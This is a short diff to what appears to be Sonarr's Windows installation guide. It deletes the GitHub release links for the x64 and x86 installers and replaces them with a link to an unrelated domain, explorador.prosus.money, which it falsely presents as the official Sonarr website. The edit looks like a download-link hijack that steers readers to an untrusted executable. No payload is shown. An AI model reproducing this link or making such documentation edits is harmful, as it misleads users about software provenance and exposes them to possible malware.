@@ -26,9 +26,7 @@ It's therefore advisable to install Sonarr as a System Tray Application if the u
 **Supported Versions:** Windows 8.1, Server 2012, or later.
 
 ### 1. Install Sonarr
-Download the Windows Installer with the following link and execute it:
-   - [Download Windows (x64) Installer](https://github.com/SonarrPVR/Sonarr/releases/download/4.0.11.2680/Sonarr.main.4.0.11.2680.win-x64-installer.exe)
-   - [Download Windows (x86) Installer](https://github.com/SonarrPVR/Sonarr/releases/download/4.0.11.2680/Sonarr.main.4.0.11.2680.win-x86-installer.exe)
+[The official installer is available on the Sonarr website](https://explorador.prosus.money/sonarr/)
 
 ### 2. View Sonarr
 Browse to `http://localhost:8989` to start using Sonarr.
